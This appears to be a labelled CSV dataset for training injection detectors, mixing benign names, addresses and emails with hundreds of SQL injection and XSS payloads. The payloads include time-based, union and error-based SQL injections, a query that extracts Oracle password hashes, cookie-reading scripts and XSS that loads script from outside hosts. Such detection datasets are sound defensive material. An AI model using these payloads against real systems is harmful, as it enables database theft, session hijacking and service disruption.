index,payload,type
2010,"  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  9339  =  9339  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ",sqli
19328,"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationstart=""alert(1)""></body>",xss
1913,"1'+  (  select dyfw where 7743  =  7743 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",sqli
16954,"<div draggable=""true"" contenteditable>drag me</div><var ondrop=alert(1) contenteditable>drop here</var>",xss
17010,"<dl oncopy=""alert(1)"" contenteditable>test</dl>",xss
1237,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",sqli
20189,"<tr oncopy=""alert(1)"" contenteditable>test</tr>",xss
93,select * from users where id  =  '1' *$ . or 1  =  1 -- 1',sqli
18896,"<style>:target {transform: rotate(180deg);}</style><datalist id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></datalist>",xss
14043,"c/ fray diego de cadiz, 50",benign
11505,oseja,benign
2971,"1'||  (  select 'jlka' where 5436  =  5436 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
16124,"<button onkeypress=""alert(1)"" contenteditable>test</button>",xss
1904,"1'||  (  select 'zpwe' from dual where 7743  =  7743 union all select null,null#",sqli
3656,"1 and make_set  (  8403  =  8403,8899  )  ",sqli
14747,basilia,benign
13052,6370,benign
19929,"<td oncopy=""alert(1)"" contenteditable>test</td>",xss
3330,"-9996' or make_set  (  1237  =  7111,7111  )  ",sqli
12702,8217,benign
20505,"<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>",xss
3651,"-9566%""  )   union all select 7973,7973,7973,7973--",sqli
19722,<svg><basefont onload=alert(1)></basefont>,xss
20815,"xmlns:svg=""http://www.w3.org/2000/svg"">",xss
19081,"<style>@keyframes slidein {}</style><map style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></map>",xss
3907,1'||  (  select 'zzkx' where 3270  =  3270 and 2006  =  2006,sqli
13636,chinaphan@viajesdacapalla.eh,benign
20469,"<xmp onmouseenter=""alert(1)"">test</xmp>",xss
13331,manda,benign
19037,"<style>@keyframes slidein {}</style><content style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></content>",xss
15325,<x contenteditable onkeydown=alert(1)>press any key! ,xss
18110,"<ruby onbeforepaste=""alert(1)"" contenteditable>test</ruby>",xss
19602,"<sub onmousemove=""alert(1)"">test</sub>",xss
17836,<isindex id=x tabindex=1 onactivate=alert(1)></isindex>,xss
459, or 1/*,sqli
12118,47eg0,benign
20746,<!-- Up to Opera 12.x -->,xss
17273,"<font onkeypress=""alert(1)"" contenteditable>test</font>",xss
14270,"calle sergio luna, s/n 11g",benign
16182,"<caption oncontextmenu=""alert(1)"">test</caption>",xss
2091,"-9821  )   as qqrm where 7152  =  7152 union all select 7152,7152,7152,7152--",sqli
13974,"colon 111, 13-c",benign
3359, (  select   (  case when   (  8130  =  5894  )   then 8130 else 8130*  (  select 8130 from information_schema.character_sets  )   end   )    ) ,sqli
243," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",sqli
1979,"1""  )   where 7950  =  7950 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
2978,"1' where 7353  =  7353 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
23,"admin"" or ""1""  =  ""1""--",sqli
11969,demonlatra,benign
15735,"<audio onpaste=""alert(1)"" contenteditable>test</audio>",xss
13485,de las muecas pedrol,benign
19838,<svg><title onload=alert(1)></title>,xss
17365,"<frame onclick=""alert(1)"">test</frame>",xss
15062,8ap6l4984,benign
18706,"<style>:target {color: red;}</style><tbody id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tbody>",xss
12442,harry,benign
19302,"<style>@keyframes x{}</style><area style=""animation-name:x"" onanimationstart=""alert(1)""></area>",xss
19839,<svg><tr onload=alert(1)></tr>,xss
14460,alises,benign
573, or user like '%,sqli
12730,log9era,benign
1088,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",sqli
15564,"<address onmouseup=""alert(1)"">test</address>",xss
19872,"<table onmousedown=""alert(1)"">test</table>",xss
13013,6320,benign
12900,ardurn,benign
3298,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,sqli
17808,<ins id=x tabindex=1 onfocus=alert(1)></ins>,xss
19117,"<style>@keyframes slidein {}</style><shadow style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></shadow>",xss
13697,berleand@campanasextractoras.la,benign
3856,"-9572%""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,sqli
18008,<rp id=x tabindex=1 onbeforedeactivate=alert(1)></rp><input autofocus>,xss
12748,millares,benign
184,or 0  =  0 #,sqli
3753,-3613%'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  '%'  =  ',sqli
12789,keung,benign
602," select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1'",sqli
12400,3.89E+15,benign
2410,"1%' union all select null,null,null,null,null,null,null,null--",sqli
1416,"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",sqli
3577,"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""grct""  =  ""grct",sqli
14554,28221877a,benign
1266,"1%""   )    )     )   union all select null#",sqli
19241,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><output id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></output>",xss
13258,verney,benign
13377,v70t4oso,benign
14837,charmion,benign
17607,"<html onmouseover=""alert(1)"">test</html>",xss
14597,6.80E+13,benign
17491,<header id=x tabindex=1 onfocus=alert(1)></header>,xss
11311,45641,benign
15077,"c/ arc de sant ramon del call, 189, 2-e",benign
20273,<u id=x tabindex=1 onactivate=alert(1)></u>,xss
13296,5.75E+15,benign
3493,"-5130'   )    )    union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",sqli
11792,557ni03r5o,benign
19928,"<td oncontextmenu=""alert(1)"">test</td>",xss
19023,"<style>@keyframes slidein {}</style><big style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></big>",xss
11611,azcrate campalan,benign
14082,rodis-ryan@colorprint.info,benign
19149,"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xss>",xss
19985,<textarea id=x tabindex=1 onbeforedeactivate=alert(1)></textarea><input autofocus>,xss
2766,"1'   )    )    as omwk where 1414  =  1414 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
15587,"<applet onkeydown=""alert(1)"" contenteditable>test</applet>",xss
3052,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",sqli
2468,-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,sqli
18648,"<style>:target {color: red;}</style><kbd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></kbd>",xss
17000,<dl id=x tabindex=1 onbeforedeactivate=alert(1)></dl><input autofocus>,xss
18481,"<span onmouseout=""alert(1)"">test</span>",xss
16478,"<datalist onmousedown=""alert(1)"">test</datalist>",xss
2738,"1%' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",sqli
2678,"1'||  (  select 'setd' from dual where 3686  =  3686   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   ||'",sqli
17243,"<figure onmousedown=""alert(1)"">test</figure>",xss
18932,"<style>:target {transform: rotate(180deg);}</style><label id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></label>",xss
20643,"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss
3004,select   (  case when   (  7997  =  1543  )   then 7997 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,sqli
18504,"<strike ondblclick=""alert(1)"">test</strike>",xss
13115,gwenda,benign
11360,canaan,benign
13063,laurencia,benign
2014,1' where 6116  =  6116,sqli
20655,"<XML SRC=""http://ha.ckers.org/xsstest.xml"" ID=I></XML>",xss
18564,"<style onclick=""alert(1)"">test</style>",xss
14854,burgs campa,benign
14779,serra stark,benign
15961,"<blink draggable=""true"" ondrag=""alert(1)"">test</blink>",xss
1155,"1""   )    )    as fhlg where 1004  =  1004 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",sqli
1203,select   (  case when   (  2774  =  5503  )   then 2774 else 2774*  (  select 2774 from information_schema.character_sets  )   end  )  #,sqli
1111,"1' where 8749  =  8749 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
19658,"<sup ondblclick=""alert(1)"">test</sup>",xss
14448,vicens,benign
3547,1'+  (  select 'dpun' where 4760  =  4760,sqli
3857,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,sqli
18374,"<small oncopy=""alert(1)"" contenteditable>test</small>",xss
1528,"1""   )    )    as brwj where 9180  =  9180",sqli
12145,28413,benign
17287,"<footer draggable=""true"" ondragstart=""alert(1)"">test</footer>",xss
18220,"<script onmouseenter=""alert(1)"">test</script>",xss
11617,6.69E+14,benign
11374,israel_piggot@joyclub.pe,benign
12072,prdica,benign
17640,"<i onmouseup=""alert(1)"">test</i>",xss
1316,"-3955%'   )    )    union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",sqli
13436,sunderla,benign
15245,4urr3at9,benign
16520,"<del draggable=""true"" ondragenter=""alert(1)"">test</del>",xss
1633,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,sqli
18038,<rt id=x tabindex=1 onactivate=alert(1)></rt>,xss
17513,"<header onpaste=""alert(1)"" contenteditable>test</header>",xss
11760,99020664y,benign
2153,"1""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sqli
11594,calle soria 154 2a,benign
14106,torreblacos,benign
759,1' or '1'  =  '1,sqli
18921,"<style>:target {transform: rotate(180deg);}</style><hr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></hr>",xss
19365,"<style>@keyframes x{}</style><dir style=""animation-name:x"" onanimationend=""alert(1)""></dir>",xss
11564,"lugar los morros, 50, 9?c",benign
3660,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",sqli
20680,<sCriPt/src=//14.rs?,xss
20850,feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>,xss
19340,"<style>@keyframes x{}</style><cite style=""animation-name:x"" onanimationstart=""alert(1)""></cite>",xss
1484,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",sqli
2305,1'   )    )    as xpmy where 5274  =  5274 rlike   (  select   (  case when   (  6252  =  7704  )   then 1 else 0x28 end   )    )   --,sqli
13859,10702,benign
3210,"-3379  )   union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",sqli
13882,matilla la seca,benign
15630,"<article draggable=""true"" ondragend=""alert(1)"">test</article>",xss
19055,"<style>@keyframes slidein {}</style><font style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></font>",xss
3442,"1""   )    )    and make_set  (  8266  =  9226,9226  )   and    (    (   ""omjx"" like ""omjx",sqli
12397,dulcera,benign
12959,55585768n,benign
11998,morn de almazn,benign
2945,1' where 2134  =  2134 rlike   (  select   (  case when   (  3613  =  2090  )   then 1 else 0x28 end   )    )   --,sqli
18195,"<script draggable=""true"" ondragenter=""alert(1)"">test</script>",xss
17411,"<frameset onmouseover=""alert(1)"">test</frameset>",xss
17031,<dt id=x tabindex=1 onbeforeactivate=alert(1)></dt>,xss
17208,"<figcaption onkeydown=""alert(1)"" contenteditable>test</figcaption>",xss
754,hi' or 'a'  =  'a,sqli
20608,"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss
19264,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><span id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></span>",xss
2542,"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'dsok'  =  'dsok",sqli
3252,select   (  case when   (  6839  =  2730  )   then 6839 else 6839*  (  select 6839 from mysql.db  )   end  )  #,sqli
3817,"1 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",sqli
1454,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",sqli
20422,<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>,xss
11730,20120,benign
17592,<html onblur=alert(1) tabindex=1 id=x></html><input autofocus>,xss
17669,"<iframe onmouseleave=""alert(1)"">test</iframe>",xss
17883,<pre id=x tabindex=1 onfocusin=alert(1)></pre>,xss
11407,reiji,benign
20491,<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>,xss
19901,"<tbody onkeydown=""alert(1)"" contenteditable>test</tbody>",xss
14139,spano-macary@biosaludsystems.ml,benign
422," select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",sqli
12090,"c/ 57 15, 9g",benign
20162,"<title onkeypress=""alert(1)"" contenteditable>test</title>",xss
20017,<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>,xss
1127,-6233'  )   where 9820  =  9820 or 3038  =  3038,sqli
14224,"cardenal mendoza s/n, 7?h",benign
1537,"-4305   )    )     )   union all select 2401,2401--",sqli
761,",@variable",sqli
17649,<iframe id=x tabindex=1 onactivate=alert(1)></iframe>,xss
11328,0o380ado6,benign
15494,"<abbr onmousedown=""alert(1)"">test</abbr>",xss
17853,"<plaintext onbeforecut=""alert(1)"" contenteditable>test</plaintext>",xss
1608,"1%""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
19574,"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationstart=""alert(1)""></xss>",xss
15125,besal,benign
3213,1'||  (  select 'aioq' from dual where 8176  =  8176,sqli
19361,"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onanimationend=""alert(1)""></dfn>",xss
11780,712,benign
16410,<content onfocusout=alert(1) tabindex=1 id=x></content><input autofocus>,xss
1769,"-1269' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'gohv' like 'gohv",sqli
13141,knio,benign
1689,"-3964""  )   where 3566  =  3566 order by 1--",sqli
3514,begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,sqli
15664,"<aside draggable=""true"" ondragleave=""alert(1)"">test</aside>",xss
505," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",sqli
966,"1""  )   where 2136  =  2136 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli
17297,<footer onblur=alert(1) tabindex=1 id=x></footer><input autofocus>,xss
18439,"<spacer oncut=""alert(1)"" contenteditable>test</spacer>",xss
13342,87811832v,benign
15976,"<blink onclick=""alert(1)"">test</blink>",xss
20563,<img src=`xx:xx`onerror=alert(1)>,xss
12896,candelario,benign
14407,"calle calderon de la barca, 141",benign
3939,"1%"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,sqli
14453,86168713h,benign
15400,"<script/src=""data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)",xss
16887,"<div draggable=""true"" contenteditable>drag me</div><s ondragover=alert(1) contenteditable>drop here</s>",xss
11463,1064,benign
1652,"1%'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  '%'  =  '",sqli
20592,"<a  href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click  Me</a>",xss
3569,1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'mmow'  =  'mmow,sqli
2875,"1"" where 9889  =  9889",sqli
17160,<fieldset id=x tabindex=1 onactivate=alert(1)></fieldset>,xss
18589,"<style>:target {color: red;}</style><article id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></article>",xss
18355,"<slot onmouseup=""alert(1)"">test</slot>",xss
128, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,sqli
2566,"1   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   4348  =  4348",sqli
12740,5.39E+15,benign
638,admin'  )   or   (  '1'  =  '1'#,sqli
16651,"<dir draggable=""true"" ondragstart=""alert(1)"">test</dir>",xss
1620,"1""   )    )    as tgwp where 9405  =  9405",sqli
14698,baigent@blueberryminiloaf.com.dj,benign
16951,"<div draggable=""true"" contenteditable>drag me</div><ul ondragover=alert(1) contenteditable>drop here</ul>",xss
2788,1'   )    )    and 3814  =  4272--,sqli
11667,sertino,benign
12677,19140,benign
20118,<time id=x tabindex=1 onfocusin=alert(1)></time>,xss
13340,reis,benign
19931,"<td ondblclick=""alert(1)"">test</td>",xss
3813,-9212 or 1026  =  7967#,sqli
14202,24410,benign
11421,m7124v3,benign
979,-3834'   )    )    as hhiy where 2086  =  2086 or 3038  =  3038,sqli
2961,1  )   where 7552  =  7552 order by 1#,sqli
18065,"<rtc draggable=""true"" ondrag=""alert(1)"">test</rtc>",xss
16812,"<div draggable=""true"" contenteditable>drag me</div><keygen ondrop=alert(1) contenteditable>drop here</keygen>",xss
1573,"-2920""   )    )    as zdgv where 9702  =  9702 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",sqli
14853,5.96E+15,benign
14544,que3h5a,benign
969,select   (  case when   (  1275  =  7674  )   then 1275 else 1275*  (  select 1275 from information_schema.character_sets  )   end  )  #,sqli
12134,valeika@italianmotorvillagesevilla.gd,benign
2563,"1'+  (  select oqvo where 7448  =  7448 union all select null,null,null,null,null--",sqli
13162,26586,benign
2428,"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""wdye"" like ""wdye",sqli
1706,"1 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",sqli
18819,"<style>:target {color:red;}</style><plaintext id=x style=""transition:color 1s"" ontransitionend=alert(1)></plaintext>",xss
13769,s-ierro,benign
13151,hays_adiarte@lingotes.com.je,benign
2680,1' where 9216  =  9216,sqli
16372,<command onblur=alert(1) tabindex=1 id=x></command><input autofocus>,xss
11711,8121,benign
19935,"<td onkeyup=""alert(1)"" contenteditable>test</td>",xss
16564,<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>,xss
17682,<image id=x tabindex=1 onbeforeactivate=alert(1)></image>,xss
698," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",sqli
15805,"<basefont draggable=""true"" ondragstart=""alert(1)"">test</basefont>",xss
14252,"av. italia, 66, 4-a",benign
1717,1  )   as vbli where 5139  =  5139 and 2782  =  2625--,sqli
1235,"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'xngr'  =  'xngr",sqli
19194,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><fieldset id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></fieldset>",xss
960,"-3707""   )    )     )   or 8571  =  8571--",sqli
3604,"-4947' in boolean mode  )   union all select 3314,3314#",sqli
1718,"1'  )   as wpom where 2620  =  2620 and elt  (  3114  =  3114,sleep  (  5   )    )   #",sqli
16880,"<div draggable=""true"" contenteditable>drag me</div><rp ondrop=alert(1) contenteditable>drop here</rp>",xss
14677,7092,benign
20761,"</svg>//[""'`-->]]>]</div>",xss
1938,"1  )   as bfuy where 3879  =  3879 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
12279,santa cruz de tenerife,benign
1658,begin dbms_lock.sleep  (  5  ) ,sqli
1889,-2100' where 9260  =  9260 or 3038  =  3038,sqli
16820,"<div draggable=""true"" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>",xss
2940,"-5124'+  (  select 'xpww' where 1752  =  1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",sqli
20642,"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
662,  )   or   (  'a'  =  'a,sqli
16336,<colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>,xss
19476,"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationstart=""alert(1)""></p>",xss
17450,"<head draggable=""true"" ondrag=""alert(1)"">test</head>",xss
15254,callie,benign
1455,"-1083'  )   union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",sqli
3055,1'+  (  select tzvm where 5145  =  5145 and 4192  =  7437#,sqli
16608,"<dfn onmouseenter=""alert(1)"">test</dfn>",xss
14718,7stambrar,benign
11572,grandy,benign
15626,"<area onmouseover=""alert(1)"">test</area>",xss
15804,"<basefont draggable=""true"" ondragleave=""alert(1)"">test</basefont>",xss
555," select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1",sqli
16941,"<div draggable=""true"" contenteditable>drag me</div><title ondragover=alert(1) contenteditable>drop here</title>",xss
11720,"passeig gaudi 77, 3-e",benign
13512,trbena,benign
13001,bullicioso,benign
14049,9.19E+15,benign
17829,"<ins onmouseup=""alert(1)"">test</ins>",xss
3032,"1""  )   as rcnk where 1800  =  1800",sqli
19961,"<template oncopy=""alert(1)"" contenteditable>test</template>",xss
2169,"1' where 8277  =  8277 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",sqli
17188,"<figcaption draggable=""true"" ondragend=""alert(1)"">test</figcaption>",xss
13163,diccico_pastor@ao09.io,benign
20578,<img src ?itworksonchrome?\/onerror = alert(1)???,xss
20253,"<tt oncopy=""alert(1)"" contenteditable>test</tt>",xss
14583,newport,benign
15089,18439608w,benign
13736,mira boncompte,benign
14167,pingajosa,benign
3649,"1""   )    )    as dksq where 7161  =  7161",sqli
1191,"1""  )   as yekp where 3049  =  3049 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
3479,"1   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  7813  =  7813",sqli
15599,"<area draggable=""true"" ondrag=""alert(1)"">test</area>",xss
13706,"calle del mistral, 65",benign
12774,mario caraball,benign
13590,6766,benign
1981,"-5969"" where 9248  =  9248 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",sqli
11974,trincha-32r1,benign
1365,1'  )   as bihs where 4197  =  4197,sqli
14339,dana,benign
12099,ferreries,benign
12988,8.10E+15,benign
1836,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",sqli
16776,"<div draggable=""true"" contenteditable>drag me</div><footer ondrop=alert(1) contenteditable>drop here</footer>",xss
